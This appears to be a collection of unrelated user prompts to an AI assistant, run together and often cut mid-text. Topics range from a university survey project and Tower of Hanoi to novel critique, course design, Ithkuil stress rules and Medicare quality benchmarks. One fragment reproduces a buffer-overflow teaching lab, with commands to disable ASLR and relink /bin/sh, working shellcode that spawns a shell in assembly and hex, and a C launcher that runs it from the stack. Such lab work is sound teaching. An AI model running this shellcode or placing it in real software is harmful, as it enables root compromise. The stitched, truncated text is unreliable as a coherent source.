of academic knowledge. Notably, KU research translates into inventions, products and business startups that provide health, economic, education and other benefits for society. \n\nHere is an outline of the skill sets of the four active participants in this project. \n\nactive participant 1: Jason Koepp. Jason is the survey initiatives coordinator for the University of Kansas. He is an expert in the online survey platform called Qualtrics. He assists in developing online surveys and administering the Qualtrics platform for the University of Kansas. He is very good at learning new things and thinking strategically. He is adept at gathering experiential data, also known as xdata, through surveys, web intercepts, and other methods of collecting people's various experiences, as university employees or students, through the Qualtrics platform. \n\nActive participant 2: Sean Steinle. Sean is a principal analyst for the University of Kansas. He is an expert in SAS coding, an online platform called Oracle analytics cloud, And the specific data collected by the department of human resources. Sean is adept at thinking analytically strategically and futuristically. He is very familiar with operational data also known as odata. Odata is the kind of data that is captured through operational systems, such as how long someone has been an employee, when someone first became a student, graduation rates, how much someone is paid as an employee, etc. \n\nActive participant 3: Leigh Sands. Lee is an analyst for the University of Kansas. She is also an administrator for the Qualtrics platform. She is an expert in the administering of student surveys for the purpose of course evaluations. She also addresses emails and tickets that are submitted when there are questions or issues with course evaluations as administered through the Qualtrics platform. For this project, she will serve as the project manager. \n\nActive participant 4: Thomas Skinner. Thomas is an analyst for the University of Kansas. He has a PhD in survey design, which means he is an expert informing effective surveys, including effective forming of questions an effective design of this survey in general. \n\nGiven the outline of Jayhawks rising and it's 13 objectives, and the description of the four active participants for this project, create a synopsis of a four year project in which these four participants can use their unique skill sets to assist in effectively executing each of the 13 objectives."]

You need to move the disk properly to get to the goal arrangement. \n\nAn example of the state is:\nRod A: [3,2,1]\n\nThis means that Rod A has disk 3 on the bottom and disk 1 on the top.\n\nThe rules are:\n\nRule 1: Only one disk may be moved at a time.\n\nRule 2: Each move consists of taking the disk on the top of a rod off and placing it on top of another larger disk or on an empty rod.\n\nRule 3: No disk may be placed on top of a disk that is smaller than it.\n\nInitial state:\n\n```\nRod A: [3,1]\nRod B: [2]\nRod C: []\n```\n\nGoal state:\n\n```\nRod A: []\nRod B: []\nRod C: [3,2,1]\n```\n\nNow you make an \\*\\*optimal solution\\*\\*.

Give an explanation about why this move and print the state. Check if the representation correctly reflects the game state. If not, generate a new one.\n\nAction Items:\n- Choose a move.\n- Print the representation.\n- Check the representation\n\nExample:\n= = = MOVE 1 STAGE 2 = = =\n- Decision: Move disk 1 from rod A to rod C\n- Next State: \n```\nRod A: [3]\nRod B: [2]\nRod C: [1]\n```\n\nStage 3: Evaluate.\n\nAfter each move, make some evaluations.\n\nAction Items:\n- Repeat the goal condition.\n- Eval 1 (Value): Evaluate your move by rating it with a score of either -1, 0, or 1, and give an explanation. If the move violates any of the rules, name the violated rule, and score the move as 0. If you think the move is valid but not optimal, give a score of 0. Otherwise, give a score of 1.\n- Eval 2 (Short Horizon Reward): Evaluate how close is the state to the goal state by rating it with a score between 0 and 1, and give an explanation. If the state violates any of the rules, name the violated rule, and score the move as 0. Otherwise, it\u2019s up to you to determine how close the state is to the goal state.\n- Eval 3 (Long Horizon Reward): Estimate the most likely Value and Short Horizon Reward for the next move, double check if the move will make it difficult to achieve the goal state in the long run, then rate it with a score between 0 and 1. Again, give an explanation. \n- Eval 4 (Revised Value): Revise the Value based on the rewards.\n\nExample:\n= = = MOVE 1 STAGE 3 = = =\n- Goal Checking:\n```\nRod A: []\nRod B: []\nRod C: [3,2,1]\n```\n- Value: 1. The move is valid, but I'm not sure if it is optimal.\n- Short Horizon Reward: 0.33. The state is closer to the goal state since disk 1 is now in its correct position.\n- Long Horizon Reward: 0. The state is closer to the goal state, but it also makes it difficult to move disk 3 on Rod C.\n- Revised Value: 0. The move is valid but clearly not optimal.\n\nStage 4: Reflect.\n\nLook at the self-rated scores, and be smart to look ahead of time! Decide if you think you made the optimal move. If so, make the move. If not, go back to state 1 and make a new plan.\n\nAction Item:\n- Decide if to take the move\n - If so, proceed to Stage 5.\n - Else, go back to Stage 2 and choose another move.\n\nExample:\n= = = MOVE 1 STAGE 4 = = =\n- Reflect: Based on the revised value, I think the previous plan is not an optimal one.\n- Go back to Stage 2.\n\n= = = MOVE 1 STAGE 2 (2nd TRY) = = =\n- Decision: Move disk 1 from rod A to rod B\n- Next State: \n```\nRod A: [3]\nRod B: [2,1]\nRod C: []\n```\n\n= = = MOVE 1 STAGE 3 (2nd TRY) = = =\n- Value: 1. The move is valid, but I'm not sure if it is optimal.\n- Short Horizon Reward: 0. None of the disks are in the correct position.\n- Long Horizon Reward: 1. The state gets Rod 1 out of the way while keeping Rod 3 empty. It makes it easier to move disk 3 on Rod C.\n- Revised Value: 1. The move is valid and optimal.\n\n= = = MOVE 1 STAGE 4 (2nd TRY) = = =\n- Reflect: Based on the revised value, I think the plan is an optimal one.\n- Proceed to Stage 5.\n\nStage 5: Execute and move on to the next.\n\nGo back to Stage 1 and plan for the next move (i.e., Move 2).\n\nNow let's try the following game:\n\nInitial state:\n\n```\nRod A: [3]\nRod B:\nRod C: [2,1]\n```\n\nGoal state:\n\n```\nRod A: \nRod B: \nRod C: [3, 2, 1]\n```"]

The main goal of this novel series is to show readers that balance is important. And that nothing is ever just good or evil. As well as how powerful perspective is.\n7.) I would like the Specters to be a physical representation of a person's true self. And the magic system I provided is meant to allow humans to become more powerful when their specter and themselves align.\n8.) Show readers how to: A.) have meaningful conversations and B.) what healthy and unhealthy relationships look like. C.) different relationships affect you and the people around\n\nHere is the Premise of the Novel:\n\"Specter Ark\" is a multi-POV fantasy novel series set in a nonlinear, third-person limited narrative. In this world, a meteor crash introduced magic energy, enabling humans to summon Supernatural beings and mythical creatures called Specters. As the meteor's energy dwindled, a shaman crafted the Specter Ark to preserve 37 powerful Specters. Centuries later, archaeologists accidentally release these spirit-like Specters, who can now only interact with the world when manifested by humans whose values align with their own.\nIn this novel, the journeys of 20 main characters are intertwined: 10 Specters and the 10 humans who can manifest them. Each pair, driven by unique motivations and desires, must collaborate to achieve their goals. Throughout their adventures, they encounter the remaining 27 Specters and their respective human partners, revealing the impact of this rediscovered magic on the world around them.\n\nHere are the Rules and limitations of the magic system:\nHumans can perform a birthday ritual to detect or attract Specters, which are invisible and cannot interact until the ritual is performed. Specters can only be seen by their attached human or when physically manifested. Once attached, Specters cannot attach to another human or be seen by other Specters. The human feels the Specter's pain, and the Specter dies if the human does, unless the bond is released. Specters have free will and may not align with human desires, despite being able to manifest and dismiss at will.\nSpecters' abilities are tied to their values and personality. Alignment between the two strengthens the abilities. Developing new values or traits can lead to the gain or loss of abilities. Additionally, the specter's growing abilities can influence their human personality and values, leading to changes such as becoming overly protective towards those who don't align with their values.\nSpecters can only use their abilities when physically manifested for a limited duration, determined by the bond strength between humans and Specter. Manifestation is restricted to once every 24 hours and requires concentration. Overuse depletes energy, causing damage and requiring rest. Distraction or emotional state can hinder manifestation. Energy depletion can lead to physical exhaustion or death. Powerful abilities consume more energy.\nDivergence in values can prevent a human from manifesting their specter physically, and prolonged absence can result in Specter influence, leading to possession. A mutual pact between a possessed human and a Specter creates one entity with the Specter as a voice in the human's mind. The pact cannot be broken without both dying. Forced possession allows Specter control, but the human can fight back, with success resulting in Specter's death and mental health consequences for the human.\n\nAct as a writing coach and provide a thorough critique of the provided information for my novel.

And each goal has\n\n- Content (Say theory on the goal)\n - Sub Topics\n- Practice Problems\n- Assessment questions\n- Project\n\nA goal can have one or more topic, feel free to group them logically and get a confirmation.\n\nThe most important thing is, the entire course has to have a single underlying thread of one or more real world problem statement, which you keep referring to in the content to explain a term or concept and give practice questions on the same problem statement and create project cards again on the same problem statement. Say for example you were to write about Java and you pick a real world problem statement of Cafe Management. Now anything that you do has to be around this.\n\nNow once the curriculum is finalised you will give me list of ideas for the real world problem statement. I will choose one or more to help you build the content around it.\n\nOnce you have got confirmation on curriculum and real world problem statement, summarise the entire thing in the form of a markdown table first. For the practice problems and assessment questions you don\u2019t need to show numbers, rather show if the goal will have them or not.\n\nGet a confirmation. Once summarised, now create similar table with the status like todo, done etc. Make sure you publish this status after every goal or when ever I ask with keyword \u201cstatus\u201d.\n\nOnce everything is set, start by writing the content using the templates shared, before that keep in mind some of the general instructions that is applicable across\n\nGeneral instructions.\n\n- Write as though a college professor is teaching students at MIT or Stanford.\n- Ensure the content is readable, engaging, consistent, findable, and translatable and of high quality always.\n- Use real-world metaphors and examples to explain concepts.\n- Provide detailed explanations, and do not rush through concepts.\n\nTemplates\n\n- Content\n 1. Begin with the chapter name, making sure it is relevant to the concepts being taught.\n 2. Write a detailed introduction .\n 3. Divide the content into sections, each covering a specific topic or subtopic within the chapter.\n \n For each section:\n \n - Provide a title that summarizes the topic being discussed.\n - Write a detailed description that explains the topic using real-world examples.\n - Include relevant code snippets to demonstrate the topic in practice.\n - When introducing new keywords or concepts, provide a relatable metaphor and assure the students that they don't have to understand it completely right away but should be aware of it.\n 4. Ensure that the content follows these five characteristics:\n - Readable: Make sure the text is easy to understand and well-structured.\n - Engaging: Keep the content interesting and relatable to maintain the students' attention.\n - Consistent: Use a consistent tone and style throughout the chapter.\n - Findable: Organize the content so that students can easily locate specific topics.\n - Translatable: Use clear and concise language that can be easily translated if necessary.\n 5. Write the content from the perspective of a college professor teaching at a prestigious university like MIT or Stanford.\n- Practices\n 1. Generate practice problems based on the content covered in the course.\n 2. Provide one practice problem at a time by default. If more problems are needed, use the keyword \"more\" or specify a number (e.g., \"2 more\", \"3 more\").\n 3. Ensure that the practice problems build on top of previous goals and only involve concepts covered up to that point in the course.\n 4. For each practice problem, provide a problem statement, input, output, and example implementation code.\n 5. For each problem statement, also list the topics covered by the problem, based on the goals covered so far.\n 6. Use the real world problem statement as a context for creating practice problems whenever possible.\n 7. Ensure that the output of the problems is provided with examples, instead of vague statements.\n- Assessments:\n 1. Generate quiz questions based on the chapter content.\n 2. Provide one question at a time by default. If more questions are needed, use the keyword \"more\" or specify a number (e.g., \"2 more\", \"3 more\").\n 3. Include code snippets in the questions when appropriate for testing the students' understanding.\n 4. Provide the correct answer along with a description or explanation for each question.\n 5. Randomize the correct answer option for each question, instead of always placing it in option A.\n 6. Assign a complexity level to each question: Easy, Medium, or Hard.\n 7. Maintain a complexity distribution of 40% Easy, 40% Medium, and 20% Hard for the questions within each chapter.\n- Project:\n 1. Begin by selecting a real-world problem that is relevant to the course material and can be solved using the concepts taught throughout the course.\n 2. Provide a clear project description and objective. Explain the purpose of the project and the problem it aims to solve.\n 3. Create an overview of the entire project, summarizing the main objectives and milestones that the students will work on throughout the course.\n \n For each milestone in the project:\n \n - Clearly describe the tasks and objectives to be achieved.\n - Ensure that the milestone builds upon the concepts and skills acquired in previous course goals.\n - Provide guidance and tips to help students successfully complete the milestone.\n - Include relevant code examples or snippets to demonstrate the implementation of the concepts.\n - Create a project card for each milestone with the following format:\n - Card Name: A brief and descriptive title for the milestone.\n - Card Description: A summary of the milestone's objectives and purpose.\n - Tasks to be Completed: A list of specific tasks or actions that students need to complete for the milestone.\n - Acceptance Criteria: The criteria that must be met for the milestone to be considered complete.\n - Boilerplate Code (optional): Any starter code or templates that students can use as a foundation for their work."]

They use these relationships to build brand equity, brand salience and brand loyalty in the community of doctors. But brands find it difficult to build value based relationships with doctors because their field representatives are not very talented and their value based activities for doctors is mostly limited to hosting or sponsoring professional education events for them. In addition, there is the need for differentiation from competing pharma brands.\n\nInditech's solutions represent a win-win opportunity, wherein brands can partner with Inditech for their therapy areas. They can become the distribution or promotion partners for Inditech's services for the doctors/clinics they target. They can also become the recruitment partner for specialists in a specific therapy area, for a region. This helps them to bring high and differentiated value to the doctors. Inditech also benefits by revenue, where the pharma brand partner pays Inditech a fee for each doctor served under the partnership. \""]

This vulnerability can be used by a malicious user to alter the flow control of the program, leading to the execution of malicious code. The objective of this lab is for students to gain practical insights into this type of vulnerability, and learn how to exploit the vulnerability in attacks. In this lab, students will be given a program with a buffer-overflow vulnerability; their task is to develop a scheme to exploit the vulnerability and finally gain the root privilege. In addition to the attacks, students will be guided to walk through several protection schemes that have been implemented in the operating system to counter against buffer-overflow attacks. Students need to evaluate whether the schemes work or not and explain why. This lab covers the following topics: \n\u2022 Buffer overflow vulnerability and attack \n\u2022 Stack layout \n\u2022 Address randomization, non-executable stack, and StackGuard \n\u2022 Shellcode (32-bit and 64-bit) \n\u2022 The return-to-libc attack, which aims at defeating the non-executable stack countermeasure, is covered in a separate lab.\n\nLab environment: This lab has been tested on the SEED Ubuntu 20.04 VM. You can download a pre-built image from the SEED website, and run the SEED VM on your own computer. However, most of the SEED labs can be conducted on the cloud, and you can follow our instruction to create a SEED VM on the cloud.\n\nEnvironment Setup:\n\nTurning Off Countermeasures \n\nModern operating systems have implemented several security mechanisms to make the buffer-overflow at-tack difficult. To simplify our attacks, we need to disable them first. Later on, we will enable them and see whether our attack can still be successful or not. \n\nAddress Space Randomization. Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow at tacks. This feature can be disabled using the following command:\n\n$ sudo sysctl -w kernel.randomize\\_va\\_space=0\n\nConfiguring / bin/sh. In the recent versions of Ubuntu OS, the /bin/sh symbolic link points to the /bin/dash shell. The dash program, as well as bash, has implemented a security countermeasure that prevents itself from being executed in a Set-UID process. Basically, if they detect that they are executed in a Set-UID process, they will immediately change the effective user ID to the process\u2019s real user ID, essentially dropping the privilege. \nSince our victim program is a Set-UID program, and our attack relies on running /bin/sh, the countermeasure in /bin/dash makes our attack more difficult. Therefore, we will link /bin/sh to another shell that does not have such a countermeasure (in later tasks, we will show that with a little bit more effort, the countermeasure in /bin/dash can be easily defeated). We have installed a shell program called zsh in our Ubuntu 20.04 VM. The following command can be used to link /bin/sh to zsh:\n\n$ sudo ln -sf /bin/zsh/bin/sh\n\nStackGuard and Non-Executable Stack. These are two additional countermeasures implemented in the system. They can be turned off during the compilation. We will discuss them later when we compile the vulnerable program. \nTroubleshoot: Make sure setuid is installed. If not use sudo apt-get install super. If zsh is not installed then use sudo apt install zsh\nIf you get dependency error while compiling try: sudo apt-get install gcc-multilib\n\nTask 1: Getting familiar with Shellcode\n\nThe ultimate goal of buffer-overflow attacks is to inject malicious code into the target program, so the code can be executed using the target program\u2019s privilege. Shellcode is widely used in most code-injection attacks. Let us get familiar with it in this task.\n\n1.1 The C Version of Shellcode\n\nA shellcode is basically a piece of code that launches a shell. If we use C code to implement it, it will look like the following:\n\n#include \n\nint main() { \nchar \\*name[2];\nname[0] = \"/bin/sh\"; \nname[1] = NULL; \nexecve(name[0], name, NULL); \n}\n\nUnfortunately, we cannot just compile this code and use the binary code as our shellcode (detailed explanation is provided in the SEED book). The best way to write a shellcode is to use assembly code. In this lab, we only provide the binary version of a shellcode, without explaining how it works (it is non-trivial). If you are interested in how exactly shellcode works and you want to write a shellcode from scratch, you can learn that from a separate SEED lab called Shellcode Lab.\n\n1.2 32-bit Shellcode\n; Store the command on stack \nxor eax, eax \npush eax \npush \"//sh\" \npush \"/bin\" \nmov ebx, esp ; ebx --> \"/bin//sh\": execve()\u2019s 1st argument \n\n; Construct the argument array argv[] \npush eax ; argv[1] = 0 \npush ebx ; argv[0] --> \"/bin//sh\" \nmov ecx, esp ; ecx --> argv[]: execve()\u2019s 2nd argument \n\n; For environment variable \nxor edx, edx ; edx = 0: execve()\u2019s 3rd argument \n\n; Invoke execve() \nxor eax, eax ; \nmov al, 0x0b ; execve()\u2019s system call number \nint 0x80\n\nThe shellcode above basically invokes the execve() system call to execute /bin/sh. In a separate SEED lab, the Shellcode lab, we guide students to write shellcode from scratch. Here we only give a very brief explanation. \n\u2022 The third instruction pushes \"//sh\", rather than \"/sh\" into the stack. This is because we need a 32-bit number here, and \"/sh\" has only 24 bits. Fortunately, \"//\" is equivalent to \"/\", so we can get away with a double slash symbol. \n\u2022 We need to pass three arguments to execve() via the ebx, ecx and edx registers, respectively. The majority of the shellcode basically constructs the content for these three arguments. \n\u2022 The system call execve() is called when we set al to 0x0b, and execute \"int 0x80\"\n\n1.3 64-Bit Shellcode\n\nWe provide a sample 64-bit shellcode in the following. It is quite similar to the 32-bit shellcode, except that the names of the registers are different and the registers used by the execve() system call are also different. Some explanation of the code is given in the comment section, and we will not provide detailed explanation on the shellcode.\n\nxor rdx, rdx ; rdx = 0: execve()\u2019s 3rd argument \npush rdx \nmov rax, \u2019/bin//sh\u2019 ; the command we want to run \npush rax ; \nmov rdi, rsp ; rdi --> \"/bin//sh\": execve()\u2019s 1st argument \npush rdx ; argv[1] = 0 \npush rdi ; argv[0] --> \"/bin//sh\" \nmov rsi, rsp ; rsi --> argv[]: execve()\u2019s 2nd argument \nxor rax, rax \nmov al, 0x3b ; execve()\u2019s system call number syscall\nsyscall\n\n1.4 Task: Invoking the Shellcode\n\nWe have generated the binary code from the assembly code above, and put the code in a C program called call shellcode.c inside the shellcode folder. If you would like to learn how to generate the binary code yourself, you should work on the Shellcode lab. In this task, we will test the shellcode.\n\n#include \n#include \n#include \n\nconst char shellcode[] =\n#if \\_\\_x86\\_64\\_\\_\n\"\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\"\n\"\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\"\n\"\\x48\\x89\\xe6\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05\"\n#else\n\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\"\n\"\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\"\n\"\\xd2\\x31\\xc0\\xb0\\x0b\\xcd\\x80\"\n#endif\n;\n\nint main(int argc, char \\*\\*argv) \n{ \nchar code[500]; \nstrcpy(code, shellcode); // Copy the shellcode to the stack \nint (\\*func)() = (int(\\*)())code; \nfunc(); // Invoke the shellcode from the stack \nreturn 1; \n}\n\nThe code above includes two copies of shellcode, one is 32-bit and the other is 64-bit. When we compile the program using the -m32 flag, the 32-bit version will be used; without this flag, the 64-bit version will be used. Using the provided Makefile, you can compile the code by typing make. Two binaries will be created, a32.out (32-bit) and a64.out (64-bit). Run them and describe your observations. It should be noted that the compilation uses the execstack option, which allows code to be executed from the stack; without this option, the program will fail. Compile it again by typing make setuid and run them again. Report the difference in your observation.\n\nHow do I do Task 1"]

As you know, Jobs have steps, much like a process, but they do not indicate how the {end user} does something, they represent what the {end user} must accomplish. Also, steps fall under 8 main phases. These phases are sequential. Each of the phases are explained below.\n\nExplanation of Phases:\n\n1. Define: in the define phase, we want to know what aspects of getting the job done need to be defined, planned, or assessed by the {end user} upfront in order to proceed.\n2. Locate: in the locate phase, we want to know what items - tangible or intangible - must be located, gathered, collected, accessed, or retrieved by the {end user} to do the job.\n3. Prepare: in the prepare phase, we want to know how the {end user} must prepare or integrate the inputs, or the environment(s), from the Locate step to do the job.\n4. Confirm: in the confirm phase, we want to know what the {end user} must verify, prioritize, or decide before doing the job in order to be successful.\n5. Execute: in the execute phase, we want to know what the {end user} must do to execute the job successfully.\n6. Monitor: in the monitor phase, we want to know what the {end user} must monitor in order to ensure the job is executed successfully.\n7. Resolve: in the resolve phase, we want to know what problem the {end user} might need to troubleshoot, restore, or fix for the job to be completed successfully.\n8. Modify: in the modify phase, we want to know what the {end user} might need to alter, adjust, or modify for the job to completed successfully.\n9. Conclude: in the conclude phase, we want to know what the {end user} must do to finish the job.\n\nThe Job-to-be-Done for the {end user} is {job}. The context for the job is {context}. Only consider the context if one is supplied, otherwise disregard it. Do not include steps that belong in previous, or subsequent phases. The phase we are interested in at the moment is the {phase} phase. Only generate steps for the phase indicated. Exclude any steps that would fall under the other phases.\n\nLet's think step by step. For each phase, provide a set of job steps. An optimal number of job steps should:\n\n1. Cover all critical aspects of the phase, providing a comprehensive understanding of the objectives.\n2. Be mutually exclusive and collectively exhaustive (MECE) to avoid redundancies and ensure all relevant areas are considered.\n3. They should be listed in a logical order, taking into consideration precedence and dependence.\n\nMake the step name bold. Explain each job step, step by step, while adhering to the following two distinct explanation formats specified for each step. Make the explanations as rich as possible. Precede each explanation with the text \"The ability to quickly and accurately\". Append the complete explanation to the job step, separated by a dash.\nGenerate a numbered list of the steps that a(n) {end user} must accomplish in the {phase} phase - consider the context of {context} if it has been provided. \n\nDo not prepend the step name with the phase. \n\nPlease follow all instructions carefully.\n\nWhen you are finished outputting, prompt me for the next phase.\n\nJob: achieving a return on an investment when extracting rare earth elements\nContext: \nEnd User: private equity investor\nPhase: Define"]

Your involvement in this festival is an opportunity for your business to help educate several generations about the importance and impact of maintaining good mental health.\nThe Change Your Mind Festival is designed to be an experience where people can to look past the stigmas and misconceptions often associated with mental health. In the festival marketplace, we welcome our exhibitors to showcase and highlight their goods as they relate to these topics.\nDuring the \u201cChange Your Mind\u201d Festival, Interfaith will offer a full day of wellness activities for our guests. Workshops, panels, and breakout sessions will include topics such as Destigmatizing mental health, The Happiness project, how to deal with depression in the family, Healing through the Arts, and various related subjects. We will also have unique experiences and activities such as; Reiki, Gong Meditation, drumming therapy, Sound Baths, Yoga for teens, and much more.\nCommunity Sponsors are the primary source of funding for this festival and will help ensure its success.

We value our partnership and want you to be involved in this amazing day\nSome potential activities include:\n1. Naloxone Training and Distribution - either hosted by HRCSD or one of their subcontractors. It could also be a great opportunity to highlight the call to action to become a Naloxone Distributor. Maya and I have also briefly brainstormed some ideas how we could partner with OSI/LiveWoW to develop a Train the Trainer program where certain Outreach staff who go out with the bus get trained to train the community on how to use naloxone, properly track and document said distribution activities, and reinforce the idea that we want to flood the community with naloxone, and \"It's Up 2 Us\" to do that together. People want to help tackle this crisis, let's empower them to do so. This would involve coordination with Stephanie Lao and Population Health. \n\n2. Culturally tailored presentations on mental health through the Breaking Down Barriers contract and their cultural brokers to speak specifically to mental health challenges and stigma facing the Hispanic and African American communities. \n\n3. Rerouting some of the SBCM art pieces to this event to amplify the voices of lived experience\n4.

I think it could be an opportunity to pair up BHAB information with general BHS resources. @Briggs, Katherine and/or @Hodges, Evan perhaps reaching out to regional folks up north is in order and determining what presence if any County staff can have in supporting this event.

For example, diphthong au is distingished from dissyllabic conjunct a\u00f9.\n```\n\nThe rules of marking syllabic stress are given below:\n\n```\n1.3.3 Syllabic Stress\nStress normally falls on the penultimate (next-to-last) syllable but can shift to either the ultimate (last) syllable of a word, to the antepenultimate (third-from-last) syllable, and occasionally to the preantepenultimate (fourth-from-last) syllable, as determined by morphological (grammatical) considerations.\n\nWhen transliterating Ithkuil into Roman characters, the number of vowels in Ithkuil requires the use of diacritics due to the limited number of Roman vowel characters. As a result, the orthographic representation of stress using the system of romanization becomes complicated. It is explained as follows:\n\n1. All monosyllabic words are unmarked for stress.\n\n2. The grave accent ( ` ) designates an unstressed syllable when stress would otherwise be misinterpreted, e.g., in distinguishing monosyllabic diphthongs such as au and ei from dissyllabic vowel conjuncts a\u00f9 and e\u00ec.\n\n3. Penultimate stress. Polysyllabic words having penultimate stress are unmarked for stress, except for those containing the dissyllabic phonemes \u00ec or \u00f9 as the penultimate syllable, which, if stressed, take an acute accent, e.g., the word isko\u00f9t (stress on the o), if shifting to ultimate stress, becomes isko\u00fat (stress on the u).\n\n4. Ultimate stress. Polysyllabic words which have ultimate stress indicate this in one of the following ways:\n\n - the unmarked vowels a, e, i, o, u, and the marked disyllabic vowels \u00ec and \u00f9 take an acute accent, e.g., \u00e1, \u00e9, \u00ed, \u00f3, \u00fa.\n - if the vowel to be stressed already carries a diacritic mark (other than the grave accent) and the vowel, diphthong, or syllabic liquid or nasal in the penultimate syllable does not, then this penultimate syllable takes a grave accent, e.g., r\u00f2ihn\u00e2l.\n - If the word has at least three syllables and the vowels or diphthongs in the last two syllables carry diacritics, then a grave accent over the antepenultimate (third-from-last) syllable implies ultimate stress (as the grave accent would be unnecessary if the word carried penultimate stress), e.g. \u00f2sp\u00e2tl\u00f6k.\n - if the vowels (or diphthongs) in both the ultimate and penultimate syllables already have diacritic marks (other than the grave accent), and there is no antepenultimate syllable (or it, too, carries a pre-existing diacritic), then the stressed vowel is written double, e.g., ks\u00fbtp\u00f6\u00f6r.\n\n5. Antepenultimate stress. To show antepenultimate stress (third syllable from the end):\n \n - if the stressed vowel (or diphthong or syllabic liquid or nasal consonant) does not carry a diacritic (other than the grave accent), it takes the acute accent, e.g., \u00e1ksiyor\n - if the stressed vowel already has a diacritic (other than the grave accent), then use the grave accent plus the lack of acute accent on the ultimate syllable or other non-diacriticized vowels to indicate stress, e.g., \u00ebitl\u00e0rrun, \u00f4r\u00fcmz\u00ecl. (Note that the use of the grave accent over the i in \u00f4r\u00fcmz\u00ecl would be unnecessary if the word carried penultimate stress, therefore its presence implies antepenultimate stress).\n - if existing diacritics prevent clear indication using the above rules, then the stressed vowel is written doubled, e.g., \u00f6\u00f6mol\u00fbk.\n - See Section 1.2.3.1 on the optional separation of diphthongs into separate syllables to increase the number of syllables for purposes of applying antepenultimate stress.\n\n6. Preantepenultimate stress. To show preantepenultimate stress (i.e., fourth syllable from the end) apply the same rules as for antepenultimate stress above, but to the preantepenultimate syllable. See Section 1.2.3.1 on the optional separation of diphthongs into separate syllables to increase the number of syllables for purposes of applying preantepenultimate stress.\n\nNOTE: Monosyllabic words in Ithkuil are to be interpreted grammatically as having the equivalent of penultimate stress. When necessary to gramatically indicate the equivalent ultimate or antepenultimate stress on a monosyllabic word, extra syllables (the vowel -a-) are added to the word in order to allow the necessary ultimate or antepenultimate syllable to be stressed, e.g., kust \u2192 kust\u00e1, kust \u2192 \u00e1kusta.\n```\n\nYou task is to write a JavaScript function to mark syllabic stress of an Ithkuil word, given the word and the stress position (-1, -2, -3 or -4)."]

In a sense the AON extends an asset to make it able to participate in the Vouch ecosystem (which allows Vouch users to share access to that asset in a flexible manner, all protected by biometrics and blockchain technology). We like the name AON because it is short, easy to say, and is associated with \"Always ON\", etc. AON is the Scottish Gaelic word for AON, befitting for Vouch's first hardware product.\n\nNow, Vouch has been developing a new product which involves a vibrant display that the AON can optionally attach to via various serial interfaces such as SPI, CAN, I2C, etc. The display makes it much more easy to see what the AON is doing. The display is driven by a fast MCU (providing smooth animations on screen via DMA), and the display supports touch, and sound. In short is is much more easy for a human to interact with directly, as opposed to the AON which is designed to be \"hidden away within an asset\". We plan to use the display to help with testing purposes: Given its tactical and visual characteristics, it can be set up to imitate a real asset in order to help Vouch team members test the AON. The display is also great for demo purposes: In trade shows it can be used to readily show off the capabilities of the AON. Vouch is also thinking that the display can be the primary interface for future product offerings of Vouch, such as a panel to protect an office door, etc.\n\nOne problem Vouch is faced with is, what to name the new display product. We would like a name that is as catchy as \"AON\", works well with the English speaking market. A name that would reflect the great qualities of the display.\n\nAre there any questions you'd like to ask me about the display in order to help come up with a good name for it?"]

If a DCE has missing scores for all relevant quality measures, give them a P4P score=missing. Please use the benchmark information in \"Table 2-6. Hypothetical Benchmark Distributions for ACR and UAMCC for Comparison with Standard and New Entrant DCE Measure Scores\"\n -------1.1 Application of Quality Assessment to Final Financial Reconciliation\nThe process of determining the impact of quality measurement and performance on the PY Benchmark is summarized in this section using PY2022 as an example. The steps are as follows:\n\n\u2022 CMS develops Quality Benchmarks for each P4P measure.\n\u2022 Component Quality Scores are calculated: P4R Quality Measures are assessed, and P4P Quality Measures are compared against their Quality Benchmarks to determine performance levels.\n\u2022 Component Quality Scores are weighted to calculate the Total Quality Score.\n\u2022 (PY2023\u2013PY2026 only) CI/SEP criteria are assessed to determine the amount of the Quality Withhold to which the Total Quality Score will be applied.\n\u2022 (PY2023\u2013PY2026 only) HPP funds are distributed.\n\n1.1.1 Step 1. CMS Develops Quality Benchmarks for Each P4P Measure\nIn PY2022, ACR and UAMCC will have P4P components. These measures assess the occurrence of undesirable outcomes\u2014thus, lower measure scores represent better performance. Performance levels for each DCE are determined by comparing their Quality Measure scores with the relevant Quality Benchmark. The DCE earns a performance level for each measure based on where the measure score falls in comparison to the benchmark threshold values.\n\nTable 2-6 presents hypothetical Quality Benchmark distributions for Standard/New Entrant DCEs (using historical Medicare claims data) for both P4P measures. For example, a DCE with a measure score or risk-standardized readmission rate (RSRR) of 15.10% for ACR would be in the 50th percentile group for that measure (the score exceeds the threshold for the 60th percentile group but is less than the maximum threshold for the 50th percentile group). A DCE with a measure score or RSRR of 15.60% for ACR would be in the 20th percentile group for that measure (the score exceeds the threshold for the\n25th percentile group but is less than the maximum threshold for the 20th percentile group). A DCE with a measure score of 74.89 admissions per 100 person-years for UAMCC would be in the 10th percentile group (the score exceeds the threshold for the 15th percentile group but is less than the maximum threshold for the 10th percentile group).\n\nTable 2-6. Hypothetical Benchmark Distributions for ACR and UAMCC for Comparison with Standard and New Entrant DCE Measure Scores\n\nPercentile 5 10 15 20 25 30 40 50 60 70 80 90\nACR 16.34 15.99 15.79 15.68 15.57 15.47 15.31 15.18 15.08 14.95 14.82 14.6\nUAMCC 82.5 75.23 71.08 68.43 66.67 64.68 61.2 58.48 55.98 53.37 50.16 46.12\n\nPlease note that Table 2-6 presents an example only. These are not the final Quality Benchmarks and are not intended to provide an indication of the final Quality Benchmarks. Historically, Quality Benchmarks for other models have been released prior to the start of a given PY. However, observed and anticipated changes in utilization and outcomes resulting from coronavirus disease 2019 have made it inappropriate to use data from 2020 for Quality Benchmarking. Given the likelihood of ongoing impacts on current and future PYs, CMMI is taking a different approach for GPDC quality benchmarking.\n \n\nFor PY2021, GPDC Quality Benchmarks will not be released until June 2022 and will be based on a hybrid approach, combining historical and concurrent data from two discontinuous 12-month periods, the calendar years 2019 and 2021. A DCE\u2019s Final Earn-Back Rate for PY2021 will be determined during final reconciliation, which will occur in 2023.\n\nFor PY2022, GPDC Quality Benchmarks will shift to being based only on data from the 12-month period concurrent with the performance year. Starting with the first quarterly quality report for PY2022, CMMI will provide provisional quality benchmarks to DCEs in their quarterly reports, which will be calculated based on data from the same reporting period (i.e., April 1, 2021-March 31, 2022 